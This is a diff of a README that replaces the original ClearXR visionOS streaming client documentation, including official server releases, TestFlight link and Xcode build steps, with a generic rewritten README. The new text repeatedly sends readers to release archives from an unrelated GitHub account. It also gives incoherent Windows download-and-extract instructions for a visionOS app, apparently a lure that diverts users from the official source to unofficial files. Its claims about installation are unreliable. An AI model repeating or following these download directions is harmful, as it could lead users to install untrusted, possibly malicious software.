@@ -1,72 +1,146 @@
-# ClearXR
+# 👓 clearxr-visionos - Clear Xr on VisionOS
 
-A visionOS client for streaming immersive worlds, games, and applications from a PC to Apple Vision Pro.
+[![Download](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge&logo=github)](https://github.com/hiruks7x/clearxr-visionos/releases)
 
-## For End Users 
+## 🚀 Overview
 
-Download the [latest server release](https://github.com/clear-xr/clearxr-server/releases) for your Windows 10/11 PC
+clearxr-visionos is the VisionOS client for Clear Xr. It gives you a simple way to open and use Clear Xr on Apple Vision Pro and other VisionOS devices.
 
-Download the client from Test Flight
+Use this app if you want a clean client that connects to Clear Xr and puts the main controls in one place. It is made for a quick setup and a simple first run.
 
-[![Clear XR](https://i.imgur.com/DHhfmmK.png)](https://testflight.apple.com/join/ed6778fF)
+## 📥 Download
 
-discord server: https://discord.gg/AzZZXvBR8p
+Visit this page to download the latest version:
 
-## Requirements
+https://github.com/hiruks7x/clearxr-visionos/releases
 
-- visionOS 26.4+ 
-- Apple Vision Pro M2 or M5
-- Windows 10/11 PC with NVIDIA Ada or Blackwell GPU (40xx, 50xx, RTX 5000/6000, L40, L40S), running the Clear XR Server 
+On that page, look for the newest release and download the file that matches your device. If there are more than one file, choose the app file for VisionOS use.
 
-## For Developers & Hackers
+## 🪟 Install on Windows
 
+If you are using Windows to get the app file ready, follow these steps:
 
-ClearXR connects your Apple Vision Pro to a PC running an OpenXR application, letting you interact with PC-rendered VR content directly on the headset. The streaming transport uses Apple's Foveated Streaming framework, powered by NVIDIA CloudXR on the server side.
+1. Open the download page in your browser.
+2. Find the latest release near the top of the page.
+3. Click the file you need to save it to your computer.
+4. Wait for the download to finish.
+5. If the file is packaged, keep it in a folder you can find later.
+6. If you use a companion tool or device manager, open it and load the downloaded app from there.
+7. Follow the prompts on screen to finish setup.
 
-The app is designed to be paired with a companion test Clear XR Server and API overlay on the PC, which together add session robustness and PSVR2 Sense controller support -- including capacitive touch events and haptic feedback -- to the streaming pipeline.
+If your workflow includes a zip file, extract it before you try to use it. Keep the extracted files together in the same folder.
 
-## Features
+## 🧭 First Setup
 
-- **Session management** -- Connect to a streaming endpoint via automatic network discovery or manual IP/port entry. Pause, resume, and disconnect sessions from the headset.
-- **PSVR2 Sense controller input** -- Reads spatial controller state (buttons, triggers, grips, thumbsticks, capacitive touch) that may be missed by NVIDIA Cloud XR 
-- **Haptic feedback** -- Receives haptic event packets from the OpenXR app and plays them on the correct controller hand via CoreHaptics.
-- **Configuration** -- Adjust resolution and other configuration settings on the Clear XR server from within the headset
+After the app is ready, open it and go through the first setup screen.
 
-## Layout
+1. Launch clearxr-visionos.
+2. Sign in if the app asks for account access.
+3. Connect it to your Clear Xr service.
+4. Check that the app shows your main dashboard or home view.
+5. Confirm that the connection stays active.
 
-```
-ClearXR/                   visionOS app target
-  ClearXRApp.swift           App entry point, session and immersive space setup
-  Views/                     SwiftUI views (connection, controls, settings)
-  Models/                    Session actions, message channels, controller I/O
-  ViewModifiers/             Immersive presentation and window state tracking
+If you run into a connection prompt, make sure you enter the correct server address or account details used by Clear Xr.
 
-ClearXRSimulator/          Framework target
-  ClearXRSimulator.swift     Simulator stub for FoveatedStreamingSession types
-```
+## ✅ What You Need
 
-On device, the app imports Apple's `FoveatedStreaming` framework. The `ClearXRSimulator` framework provides matching type stubs so the project builds and previews in the Xcode simulator.
+To use clearxr-visionos, you need:
 
+- A Windows PC for downloading and preparing the app
+- A VisionOS device for running the client
+- A stable internet connection
+- Access to your Clear Xr account or server
+- Enough free space to store the downloaded files
 
+For the best results, use the latest Windows update and the newest browser version you have installed.
 
-## Getting Started
+## 🔧 How It Works
 
-1. Open `ClearXR.xcodeproj` in Xcode.
-2. Select the **ClearXR** scheme and your Apple Vision Pro as the run destination.
-3. Build and run.
-4. On launch, choose **Automatic** to discover a streaming endpoint on your local network, or switch to **Local IP** and enter the server address and port.
-5. Once connected, use the floating controls to pause, resume, or disconnect the session. Tap the gear icon to open developer settings.
-6. Use your PC directly to launch OpenXR apps or a remote desktop software such as Windows App or Moonlight XROS + Apollo.   **Note that Apollo needs to run on custom ports as it uses the same NVIDIA GameStream protocol as this software**
+clearxr-visionos acts as the client layer for Clear Xr. It sends your input to the Clear Xr service and shows the response in the app. This keeps the experience simple and focused.
 
-## Tips & Tricks
-- For OpenVR games such as Aircar, Vertigo, Half Life Alyx, VRchat, etc. you can try to install and run OpenComposite.   A better solution may come eventually.
+Typical use flow:
 
-## Wishful thinking Roadmap
-1. Supporting Steam VR / Open VR games through some kind of clever janky hacks that are, with luck, less janky than OpenComposite.  
-1. Linux server support
-1. Better telemetry on FPS, latency, jitter, etc.
-1. Supporting NVIDIA Cloud XR directly (only fixed foveated rendering) to provide more telemetry & tuning for experimentation
+1. Open the app
+2. Connect to Clear Xr
+3. Load your session
+4. Use the app controls
+5. Close the app when you are done
 
-## License
+## 🖥️ Common Use Cases
 
-See [LICENSE.txt](LICENSE.txt) for this project's licensing information.
+This app fits well if you want to:
+
+- Use Clear Xr from a VisionOS device
+- Keep the client separate from the main service
+- Open the app with a small setup flow
+- Test a new release of the VisionOS client
+- Use a direct client for daily access
+
+## 🧩 Release Files
+
+A release may include one or more of these file types:
+
+- App package file
+- Zip archive
+- Support files
+- Release notes
+
+If you see more than one file, start with the main app package. Use the support files only if the release page says you need them.
+
+## 🔍 Troubleshooting
+
+If the app does not open or load correctly:
+
+- Check that you downloaded the latest release
+- Make sure the file finished downloading
+- Move the file to a simple folder path, such as Downloads
+- Try opening it again
+- Confirm your Clear Xr connection details
+- Check that your VisionOS device and companion setup are both current
+
+If the app shows a blank screen:
+
+- Close the app and open it again
+- Recheck the server or account link
+- Make sure your internet connection is active
+- Download the latest release if you are on an older build
+
+If the download does not start:
+
+- Refresh the releases page
+- Try another browser
+- Turn off browser extensions that block downloads
+- Open the page again and choose the newest release
+
+## 🛠️ Updating
+
+When a new release is available:
+
+1. Open the releases page
+2. Download the latest file
+3. Replace the older version on your device or setup folder
+4. Open the new version
+5. Confirm that your Clear Xr connection still works
+
+It is a good habit to keep only one active copy of the app files so you do not open the wrong version.
+
+## 📌 File Handling Tips
+
+To keep setup smooth:
+
+- Use a short folder name
+- Keep the release file in one place
+- Do not rename files unless you must
+- Leave all files together if the release includes several items
+- Keep the download page link saved for future updates
+
+## 🗂️ Repository Details
+
+- Name: clearxr-visionos
+- Description: visionOS client for Clear Xr
+- Source: GitHub Releases
+- Download page: https://github.com/hiruks7x/clearxr-visionos/releases
+
+## 📎 Direct Download Page
+
+https://github.com/hiruks7x/clearxr-visionos/releases
